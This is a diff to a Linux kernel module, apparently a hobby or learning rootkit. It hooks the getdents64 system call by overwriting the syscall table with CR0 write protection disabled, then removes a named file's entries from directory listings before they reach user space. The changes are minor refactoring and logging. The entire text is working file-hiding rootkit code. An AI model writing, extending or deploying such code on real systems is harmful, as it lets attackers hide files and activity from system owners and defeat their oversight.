@@ -33,8 +33,7 @@ int new_getdents64(const struct pt_regs *regs) {
     int total_bytes_read = original_getdents64_ptr(regs);
     struct linux_dirent64 *buff = (struct linux_dirent64*)regs->si;
 
-    // Can be one or more, doesn't really matter so long as it's triggered.
-    int has_been_found = 0;
+    bool has_been_found = false;
     void *first;
 
     if (total_bytes_read > 0) {
@@ -52,15 +51,12 @@ int new_getdents64(const struct pt_regs *regs) {
         while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
             curr = first + i;
 
-            char *name = curr->d_name;
-            if (!strcmp(name, file_name_to_hide)) {
-                has_been_found += 1;
-                // File matches name to hide, we need to delete it from the array.
+            if (!strcmp(curr->d_name, file_name_to_hide)) {
+                has_been_found = true;
                 int length_to_copy = total_bytes_read - i - curr->d_reclen;
 
                 // Array has been shortened by the length of the member we've just deleted.
                 total_bytes_read -= curr->d_reclen;
-                printk(KERN_ALERT "Total bytes read after delete: %d", total_bytes_read);
                 
                 void *next_pos = first + i + curr->d_reclen;
                 memmove((void*)curr, (void*)next_pos, length_to_copy);
@@ -94,6 +90,7 @@ void unload(void) {
     printk(KERN_ALERT "Shutting down.");
     zero_cr0();
     syscall_table[__NR_getdents64] = (long unsigned int)original_getdents64_ptr;  
+    printk(KERN_ALERT "getdents64 has been restored!");
     one_cr0();
     printk(KERN_ALERT "Goodbye world...");
 }
